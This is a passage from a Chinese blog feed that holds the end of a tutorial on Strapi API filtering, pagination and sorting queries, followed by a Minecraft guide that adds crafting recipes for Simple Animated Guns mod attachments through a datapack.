class="punctuation">,</span></span><br><span class="line">      <span class="attr">"updatedAt"</span><span class="punctuation">:</span> <span class="string">"2024-09-25T17:33:11.929Z"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"publishedAt"</span><span class="punctuation">:</span> <span class="string">"2024-09-25T17:33:11.924Z"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"cover_img"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">        <span class="attr">"id"</span><span class="punctuation">:</span> <span class="number">48</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">"documentId"</span><span class="punctuation">:</span> <span class="string">"curr9bdzmqaxi6hz9sw2f7q8"</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">"name"</span><span class="punctuation">:</span> <span class="string">"d6ef9eb44aed2e7335cd59efc201a18b86d6fa60.jpg"</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">"alternativeText"</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">"caption"</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">"width"</span><span class="punctuation">:</span> <span class="number">1920</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">"height"</span><span class="punctuation">:</span> <span class="number">1200</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">"ext"</span><span class="punctuation">:</span> <span class="string">".jpg"</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">"mime"</span><span class="punctuation">:</span> <span class="string">"image/jpeg"</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">"url"</span><span class="punctuation">:</span> <span class="string">"/uploads/d6ef9eb44aed2e7335cd59efc201a18b86d6fa60_41d5dbc6ce.jpg"</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">"createdAt"</span><span class="punctuation">:</span> <span class="string">"2024-09-25T17:33:11.737Z"</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">"updatedAt"</span><span class="punctuation">:</span> <span class="string">"2024-09-25T17:33:11.737Z"</span></span><br><span class="line">      <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"article_category"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">        <span class="attr">"id"</span><span class="punctuation">:</span> <span class="number">5</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">"documentId"</span><span class="punctuation">:</span> <span class="string">"dchbyr5f11zshu2gb2thyxvh"</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">"category_name"</span><span class="punctuation">:</span> <span class="string">"随想"</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">"category_alias"</span><span class="punctuation">:</span> <span class="string">"suixiang"</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">"createdAt"</span><span class="punctuation">:</span> <span class="string">"2024-09-25T07:57:58.692Z"</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">"updatedAt"</span><span class="punctuation">:</span> <span class="string">"2024-09-25T07:57:58.692Z"</span></span><br><span class="line">      <span class="punctuation">}</span></span><br><span class="line">    <span class="punctuation">}</span></span><br><span class="line">  <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">"meta"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">    <span class="attr">"pagination"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">      <span class="attr">"page"</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"pageSize"</span><span class="punctuation">:</span> <span class="number">25</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"pageCount"</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"total"</span><span class="punctuation">:</span> <span class="number">2</span></span><br><span class="line">    <span class="punctuation">}</span></span><br><span class="line">  <span class="punctuation">}</span></span><br><span class="line"><span class="punctuation">}</span></span><br></pre></td></tr></tbody></table></figure><h3 id="根据分类-id-和文章发布状态进行查询"><a class="markdownIt-Anchor" href="#根据分类-id-和文章发布状态进行查询"></a> 根据分类 id 和文章发布状态进行查询</h3><p>怎么根据分类 id 和文章发布状态进行查询？比如我要查询文章所属分类为随想且发布状态为已发布</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /api/articles?filters[article_category][<span class="built_in">id</span>][<span class="variable">$eq</span>]=5&amp;filters[state][<span class="variable">$eq</span>]=<span class="literal">true</span></span><br></pre></td></tr></tbody></table></figure><h3 id="分页查询"><a class="markdownIt-Anchor" href="#分页查询"></a> 分页查询</h3><p>通过 <code>pagination</code> 参数在请求中实现分页查询。Strapi 的分页功能包括 <code>page</code>（页码）和 <code>pageSize</code>（每页显示的记录数），我们可以在 API 请求的 URL 中传递这些参数。例如：</p><p>查询第 2 页的数据，并且每页显示 5 条文章，URL 可以写成这样</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /api/articles?pagination[page]=2&amp;pagination[pageSize]=5</span><br></pre></td></tr></tbody></table></figure><p>分页查询的结果中，Strapi 会在 <code>meta</code> 字段中返回有关分页的信息：</p><figure class="highlight json"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">{</span></span><br><span class="line">  <span class="attr">"data"</span><span class="punctuation">:</span> <span class="punctuation">[</span> ... <span class="punctuation">]</span><span class="punctuation">,</span>  <span class="comment">// 数据列表</span></span><br><span class="line">  <span class="attr">"meta"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">    <span class="attr">"pagination"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">      <span class="attr">"page"</span><span class="punctuation">:</span> <span class="number">2</span><span class="punctuation">,</span>        <span class="comment">// 当前页码</span></span><br><span class="line">      <span class="attr">"pageSize"</span><span class="punctuation">:</span> <span class="number">5</span><span class="punctuation">,</span>    <span class="comment">// 每页显示条数</span></span><br><span class="line">      <span class="attr">"pageCount"</span><span class="punctuation">:</span> <span class="number">10</span><span class="punctuation">,</span>  <span class="comment">// 总页数</span></span><br><span class="line">      <span class="attr">"total"</span><span class="punctuation">:</span> <span class="number">50</span>       <span class="comment">// 总记录数</span></span><br><span class="line">    <span class="punctuation">}</span></span><br><span class="line">  <span class="punctuation">}</span></span><br><span class="line"><span class="punctuation">}</span></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h3 id="模糊查询"><a class="markdownIt-Anchor" href="#模糊查询"></a> 模糊查询</h3><p>Strapi 支持通过 API 进行模糊查询，我们可以使用 <code>filters</code> 参数结合 <code>$contains</code> 运算符来实现模糊查询。例如：</p><p>根据文章标题（<code>title</code> 字段）进行模糊查询，查询包含某个关键词的文章列表，API 请求可以这样写：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /api/articles?filters[title][<span class="variable">$contains</span>]=keyWord</span><br></pre></td></tr></tbody></table></figure><p>我们甚至可以结合分页查询和模糊查询</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/api/articles?filters[title][<span class="variable">$contains</span>]=<span class="built_in">test</span>&amp;pagination[page]=1&amp;pagination[pageSize]=5</span><br></pre></td></tr></tbody></table></figure><h3 id="排序查询"><a class="markdownIt-Anchor" href="#排序查询"></a> 排序查询</h3><p>Strapi 支持通过 API 查询时对数据进行排序。我们可以使用 <code>sort</code> 参数来指定排序字段和顺序。</p><h4 id="单字段排序查询"><a class="markdownIt-Anchor" href="#单字段排序查询"></a> 单字段排序查询</h4><p>单字段排序查询例如：</p><p>根据 <code>updatedAt</code> 字段进行排序，可以按照如下方式查询最新更新的文章</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /api/articles?<span class="built_in">sort</span>=updatedAt:desc</span><br></pre></td></tr></tbody></table></figure><p><code>sort=updatedAt:desc</code>：按照 <code>updatedAt</code> 字段降序排列（最新的文章在前）</p><ul><li><code>desc</code>：降序排列，从新到旧。</li><li><code>asc</code>：升序排列，从旧到新。</li></ul><h4 id="多字段排序"><a class="markdownIt-Anchor" href="#多字段排序"></a> 多字段排序</h4><p>例如，首先按 <code>state</code>（状态），然后按 <code>updatedAt</code>：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /api/articles?<span class="built_in">sort</span>=state:asc,updatedAt:desc</span><br></pre></td></tr></tbody></table></figure><p>这将先按 <code>state</code> 升序排列，再按 <code>updatedAt</code> 降序排列。</p><h4 id="结合分页和过滤"><a class="markdownIt-Anchor" href="#结合分页和过滤"></a> 结合分页和过滤</h4><p>甚至可以将排序与分页、过滤结合使用。例如，查询标题中包含 <code>test</code> 的文章，按 <code>updatedAt</code> 从新到旧排序，并分页显示：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /api/articles?filters[title][<span class="variable">$contains</span>]=<span class="built_in">test</span>&amp;<span class="built_in">sort</span>=updatedAt:desc&amp;pagination[page]=1&amp;pagination[pageSize]=5</span><br></pre></td></tr></tbody></table></figure><p>这会返回包含 <code>test</code> 关键词的文章，按更新时间降序排列，并分页显示。</p><h4 id="小结"><a class="markdownIt-Anchor" href="#小结"></a> 小结</h4><p>总之，Strapi 提供了多个过滤操作符，使得我们可以灵活地查询数据</p><ul><li><code>$eq</code>：精确匹配</li><li><code>$ne</code>：不等于</li><li><code>$lt</code>：小于</li><li><code>$lte</code>：小于或等于</li><li><code>$gt</code>：大于</li><li><code>$gte</code>：大于或等于</li><li><code>$contains</code>：包含（模糊查询）</li><li><code>$notContains</code>：不包含</li><li><code>$startsWith</code>：以指定字符串开头</li><li><code>$endsWith</code>：以指定字符串结尾</li></ul><h2 id="结语"><a class="markdownIt-Anchor" href="#结语"></a> 结语</h2><p>目前我碰到的问题基本就是这些，如果有更复杂的项目时，可能才会碰到更多问题……</p><blockquote><p>关于 Nginx 如何监听 Strapi 可以看看我的 <a href="https://4rozen.github.io/2023/10/26/Vue%E9%A1%B9%E7%9B%AE%E6%89%93%E5%8C%85+%E9%83%A8%E7%BD%B2%E5%88%B0GitHub%E4%B8%BAdemo.md/">Vue 打包</a>那篇文章：解决打包后的刷新 404 问题 -&gt;Github Pages 上的 history 路由模式的可行性 -&gt; 一个可能需要的配置参考</p></blockquote><p>我不得不说的是，Strapi 对于表与表之间的引用在 API 接口调试方面体验确实很糟糕，某些接口使用 <code>documentId</code> 有些接口却只认真实 <code>id</code></p><p>不过免费的可用，还能要求什么呢 (〃￣︶￣) 人 (￣︶￣〃)</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Strapi </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Simple Animated Guns 游玩指南 / 教程</title>
      <link href="/posts/63649.html"/>
      <url>/posts/63649.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/hint.css/2.7.0/hint.min.css"><h2 id="前言"><a class="markdownIt-Anchor" href="#前言"></a> 前言</h2><p>本文将该 mod 的相关物品合成和使用方法进行了较为细致的讲解，帮助你较快掌握该 mod 的相关特性或者玩法，但是<strong>并没有</strong>涉及到物品属性的更改，如果你需要对相关物品进行<strong>属性修改</strong>，或许你可以在我的文章【<a href="https://4rozen.github.io/archives/Gamer/64665.html">Simple Animated Guns 枪械属性修改</a>】中找到灵感。</p><h2 id="我的环境"><a class="markdownIt-Anchor" href="#我的环境"></a> 我的环境</h2><p><strong>平台</strong>：<code>Windows11 Pro-23h2</code></p><p><strong>Minecraft 游戏版本</strong>：<code>1.20.1</code></p><p><strong>Mod 列表</strong>：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202506012253931.png" alt="image-20250601225300806"></p><ul><li>其中，<code>Iris Shaders</code> 为光影运行需要，并非必须 mod</li></ul><p><strong>Simple Animated Guns (以下将简称为 S.A.G) 版本</strong>：<code>1.3</code></p><h2 id="汉化相关物品描述"><a class="markdownIt-Anchor" href="#汉化相关物品描述"></a> 汉化相关物品描述</h2><p>我自己使用的是 <code>i18n</code>，该 mod 很方便，直接下载对应版本进行安装即可。</p><p>该 mod 的 MC 百科地址：<a href="https://www.mcmod.cn/class/1188.html">[i18n] 自动汉化更新</a></p><h2 id="sag-的相关内容"><a class="markdownIt-Anchor" href="#sag-的相关内容"></a> S.A.G 的相关内容</h2><p>S.A.G 模组在游戏内将会占据三页内容：</p><ul><li>S.A.G Attachments：枪械配件</li><li> S.A.G Crafting：制作相关</li><li> S.A.G Guns &amp; Ammo：枪械和子弹</li></ul><h2 id="新增加的可制作物品"><a class="markdownIt-Anchor" href="#新增加的可制作物品"></a> 新增加的可制作物品</h2><p>在上述三页内容中的 Crafting 中，可以知道作者自己定义的可制作物品</p><h3 id="1-硬化铁粒hardened_iron_ingot"><a class="markdownIt-Anchor" href="#1-硬化铁粒hardened_iron_ingot"></a> 1、硬化铁粒（hardened_iron_ingot）</h3><p>合成：此物品可由 1 硬化铁锭合成得到 9 硬化铁粒</p><p>熔炼：无</p><h3 id="2-硬化铁锭hardened_iron_nugget"><a class="markdownIt-Anchor" href="#2-硬化铁锭hardened_iron_nugget"></a> 2、硬化铁锭（hardened_iron_nugget）</h3><p>合成：此物品可由 6 硬化铁粒合成得到 1 硬化铁锭</p><p>熔炼：此物品可由 1 富集铁熔炼得到 1 硬化铁锭</p><h3 id="3-富集铁enriched_iron"><a class="markdownIt-Anchor" href="#3-富集铁enriched_iron"></a> 3、富集铁（enriched_iron）</h3><p>合成：此物品可由 2 个铁锭 + 1 个煤炭合成得到 2 个富集铁</p><p>熔炼：无</p><h3 id="4-塑料plastic"><a class="markdownIt-Anchor" href="#4-塑料plastic"></a> 4、塑料（plastic）</h3><p>合成：无</p><p>熔炼：此物品可由 1 甘蔗熔炼得到 1 塑料</p><p>此外，便是各种枪支零件，具体合成 / 熔炼方式可以自行使用 <a href="https://www.mcmod.cn/class/1674.html">REI 模组</a>查看。</p><h2 id="枪械配件"><a class="markdownIt-Anchor" href="#枪械配件"></a> 枪械配件</h2><p>目前，在 Mod 的 1.3 版本中只存在三种配件：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202506012313019.png" alt="image-20250601231304962"></p><p>第一个为<strong>全息瞄准镜</strong>（Holographic Sight）</p><p>第二个为<strong>前握把</strong>（foregrip）</p><p>第三个为<strong>炮口制动器</strong>（muzzle brake）</p><h3 id="配件制作"><a class="markdownIt-Anchor" href="#配件制作"></a> 配件制作</h3><p>知道有这些配件，还需要知道如何制作。如果你装载了 REI 这个 mod，你会发现使用快捷键 R（查看合成方法）和快捷键 U（查看用途）对这三个配件是无效的。</p><p>这是为什么呢？因为作者并未实现这三个配件的合成 / 熔炼方法：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202506021832374.png" alt="image-20250602183237263"></p><p>上图中是作者在 1.20.1 版本分支的最后一次提交记录。</p><h3 id="新建配件合成配方"><a class="markdownIt-Anchor" href="#新建配件合成配方"></a> 新建配件合成配方</h3><p>于是，我只好自己尝试创建符合 <code>recipes</code> 的合成配方：</p><p>在 mod 列表中找到 <code>SimpleAnimatedGuns-1.20.1-v1.3-BETA-3.jar</code> 将其复制一份并<strong>解压</strong>出来，能得到 <code>SimpleAnimatedGuns-1.20.1-v1.3-BETA-3\data\anim_guns\recipes</code> 这个存放合成配方的文件夹。那么，只需要自己创建合成配方 json 文件即可。</p><p>我结合作者定义的可参与合成的新物品，对于上述三种配件的合成方式设想如下：</p><ol><li><p>全息瞄准镜（<strong>sight_holo.json</strong>）</p><p><strong>P</strong>：<code>anim_guns:plastic</code> （塑料）</p><p><strong>G</strong>：<code>minecraft:glass_pane</code> （玻璃板）</p><p><strong>R</strong>：<code>minecraft:redstone</code> （红石粉）</p><p><strong>E</strong>：<code>anim_guns:enriched_iron</code> （富集铁）</p><figure class="highlight json"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">{</span></span><br><span class="line">  <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"minecraft:crafting_shaped"</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">"pattern"</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">"PGP"</span><span class="punctuation">,</span> <span class="string">" R "</span><span class="punctuation">,</span> <span class="string">" E "</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">"key"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">    <span class="attr">"P"</span><span class="punctuation">:</span> <span class="punctuation">{</span> <span class="attr">"item"</span><span class="punctuation">:</span> <span class="string">"anim_guns:plastic"</span> <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">"G"</span><span class="punctuation">:</span> <span class="punctuation">{</span> <span class="attr">"item"</span><span class="punctuation">:</span> <span class="string">"minecraft:glass_pane"</span> <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">"R"</span><span class="punctuation">:</span> <span class="punctuation">{</span> <span class="attr">"item"</span><span class="punctuation">:</span> <span class="string">"minecraft:redstone"</span> <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">"E"</span><span class="punctuation">:</span> <span class="punctuation">{</span> <span class="attr">"item"</span><span class="punctuation">:</span> <span class="string">"anim_guns:enriched_iron"</span> <span class="punctuation">}</span></span><br><span class="line">  <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">"result"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">    <span class="attr">"item"</span><span class="punctuation">:</span> <span class="string">"anim_guns:sight_holo"</span></span><br><span class="line">  <span class="punctuation">}</span></span><br><span class="line"><span class="punctuation">}</span></span><br></pre></td></tr></tbody></table></figure></li><li><p>前握把（<strong>grip_foregrip.json</strong>）<br><strong>I</strong>：<code>anim_guns:hardened_iron_ingot</code> （硬化铁锭）</p><p><strong>G</strong>：<code>anim_guns:hardened_iron_nugget</code> （硬化铁粒）</p><p><strong>E</strong>：<code>anim_guns:enriched_iron</code> （富集铁）</p><figure class="highlight json"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">{</span></span><br><span class="line">  <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"minecraft:crafting_shaped"</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">"pattern"</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">" I "</span><span class="punctuation">,</span> <span class="string">"GEG"</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">"key"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">    <span class="attr">"I"</span><span class="punctuation">:</span> <span class="punctuation">{</span> <span class="attr">"item"</span><span class="punctuation">:</span> <span class="string">"anim_guns:hardened_iron_ingot"</span> <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">"G"</span><span class="punctuation">:</span> <span class="punctuation">{</span> <span class="attr">"item"</span><span class="punctuation">:</span> <span class="string">"anim_guns:hardened_iron_nugget"</span> <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">"E"</span><span class="punctuation">:</span> <span class="punctuation">{</span> <span class="attr">"item"</span><span class="punctuation">:</span> <span class="string">"anim_guns:enriched_iron"</span> <span class="punctuation">}</span></span><br><span class="line">  <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">"result"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">    <span class="attr">"item"</span><span class="punctuation">:</span> <span class="string">"anim_guns:grip_foregrip"</span></span><br><span class="line">  <span class="punctuation">}</span></span><br><span class="line"><span class="punctuation">}</span></span><br></pre></td></tr></tbody></table></figure></li><li><p>炮口制动器（<strong>muzzle_mbrake.json</strong>）</p><p><strong>G</strong>：<code>anim_guns:hardened_iron_nugget</code> （硬化铁粒）</p><p><strong>I</strong>：<code>anim_guns:hardened_iron_ingot</code> （硬化铁锭）</p><p><strong>E</strong>：<code>anim_guns:enriched_iron</code> （富集铁）</p><figure class="highlight json"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">{</span></span><br><span class="line">  <span class="attr">"type"</span><span class="punctuation">:</span> <span class="string">"minecraft:crafting_shaped"</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">"pattern"</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">"GIG"</span><span class="punctuation">,</span> <span class="string">"   "</span><span class="punctuation">,</span> <span class="string">" E "</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">"key"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">    <span class="attr">"G"</span><span class="punctuation">:</span> <span class="punctuation">{</span> <span class="attr">"item"</span><span class="punctuation">:</span> <span class="string">"anim_guns:hardened_iron_nugget"</span> <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">"I"</span><span class="punctuation">:</span> <span class="punctuation">{</span> <span class="attr">"item"</span><span class="punctuation">:</span> <span class="string">"anim_guns:hardened_iron_ingot"</span> <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">"E"</span><span class="punctuation">:</span> <span class="punctuation">{</span> <span class="attr">"item"</span><span class="punctuation">:</span> <span class="string">"anim_guns:enriched_iron"</span> <span class="punctuation">}</span></span><br><span class="line">  <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">"result"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">    <span class="attr">"item"</span><span class="punctuation">:</span> <span class="string">"anim_guns:muzzle_mbrake"</span></span><br><span class="line">  <span class="punctuation">}</span></span><br><span class="line"><span class="punctuation">}</span></span><br></pre></td></tr></tbody></table></figure></li></ol><h3 id="修改方案注意"><a class="markdownIt-Anchor" href="#修改方案注意"></a> 修改方案注意</h3><p>如果上述设计方案存在不合理之处，想要进行自行修改的话，请确保修改后 key 中的 item 项的值为<strong>真实存在</strong>的物品 id，此值不可瞎编。</p><p>举例来说，上面 <code>muzzle_mbrake.json</code> 的 <code>E</code>（该字母可以随意指定）代表的 <code>item</code> 的值即是下面的 <code>anim_guns:enriched_iron</code>：</p><figure class="highlight json"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">"E"</span><span class="punctuation">:</span> <span class="punctuation">{</span> <span class="attr">"item"</span><span class="punctuation">:</span> <span class="string">"anim_guns:enriched_iron"</span> <span class="punctuation">}</span></span><br></pre></td></tr></tbody></table></figure><p>如果你想知道是否存在某个 id 值，可以在游戏中使用下面的命令进行测试：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/give @p anim_guns:sight_holo</span><br></pre></td></tr></tbody></table></figure><p>你只需要对 <code>anim_guns:sight_holo</code> 中冒号前后的两者进行补全试探即可。</p><p>如果你不知道 S.A.G 该 mod 中的物品 id 在哪，你可以找到解压后的文件夹，路径为：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SimpleAnimatedGuns-1.20.1-v1.3-BETA-3\assets\anim_guns\lang\en_us.json</span><br></pre></td></tr></tbody></table></figure><p>该 json 文件中定义了所有物品，你可以在该文件中确认 mod 相关的每一个物品 id。</p><p>另，<code>pattern</code> 表示物品在合成时的摆放样式，如果有格子需要为空，那么就填空格即可。</p><h3 id="配件合成尝试"><a class="markdownIt-Anchor" href="#配件合成尝试"></a> 配件合成尝试</h3><p>由于我们是新建了 json 文件，而非修改某个文件，一个很直接的实现想法就是：直接将三个 json 文件放到 recipes 文件夹中，然后重新压缩为 jar 再进行替换。</p><p>此方法很简单，但是我尝试后发现无法正确实现效果，附件仍然无法合成，可能是我在某些地方有遗漏？我没有再继续探究。</p><h3 id="构建-datapack_sag-数据包"><a class="markdownIt-Anchor" href="#构建-datapack_sag-数据包"></a> 构建 Datapack_S.A.G 数据包</h3><p>于是，我开始构建数据包来实现效果。</p><p>数据包是 <strong>原版 Minecraft 提供的官方机制</strong>，用于在不改动 MOD 本体的前提下，<strong>向游戏添加新的配方、结构、标签、函数等数据内容</strong>。</p><p>数据包通常支持往游戏中添加：</p><ul><li>合成配方（Shaped / Shapeless）</li><li>熔炉配方（smelting /blasting 等）</li><li>loot 表、函数、进度</li><li>……</li></ul><p>数据包的目录结构一般是：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">📁 YourDatapack/</span><br><span class="line">├── 📄 pack.mcmeta</span><br><span class="line">├── 📁 data/</span><br><span class="line">│   └── 📁 anim_guns/</span><br><span class="line">│       └── 📁 recipes/</span><br><span class="line">│           ├──📄 sight_holo.json</span><br><span class="line">│           ├──📄 grip_foregrip.json</span><br><span class="line">│           └──📄 muzzle_mbrake.json</span><br></pre></td></tr></tbody></table></figure><p>其中 <code>pack.mcmeta</code> 的内容如下：</p><figure class="highlight json"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">{</span></span><br><span class="line">  <span class="attr">"pack"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">    <span class="attr">"pack_format"</span><span class="punctuation">:</span> <span class="number">15</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">"description"</span><span class="punctuation">:</span> <span class="string">"S.A.G Custom Recipes"</span></span><br><span class="line">  <span class="punctuation">}</span></span><br><span class="line"><span class="punctuation">}</span></span><br></pre></td></tr></tbody></table></figure><blockquote><p><code>pack_format</code> 取决于游戏版本，可以参考<a href="https://minecraft.wiki/w/Pack_format">官方 Wiki</a></p></blockquote><p>接下来将数据包整个复制下来，粘贴到下面的目录下：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.minecraft\saves\你的存档名\datapacks\</span><br></pre></td></tr></tbody></table></figure><p>如果你开启了版本隔离，以我的存档为例，路径可能是：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">F:\PCL2\.minecraft\versions\1.20.1-Fabric 0.16.14\saves\新的世界\datapacks\</span><br></pre></td></tr></tbody></table></figure><p>使得最后路径为：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">F:\PCL2\.minecraft\versions\1.20.1-Fabric 0.16.14\saves\新的世界\datapacks\Datapack_S.A.G</span><br></pre></td></tr></tbody></table></figure><p>粘贴后的目录结构为（已忽略不相关文件夹）：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">📁 .minecraft</span><br><span class="line">├── 📁 versions</span><br><span class="line">│   └── 📁 1.20.1-Fabric 0.16.14</span><br><span class="line">│       └── 📁 saves</span><br><span class="line">│           └── 📁 新的世界</span><br><span class="line">│               └── 📁 datapacks</span><br><span class="line">│                   └── 📁 Datapack_S.A.G</span><br><span class="line">│                       ├── 📄 pack.mcmeta</span><br><span class="line">│                       └── 📁 data</span><br><span class="line">│                           └── 📁 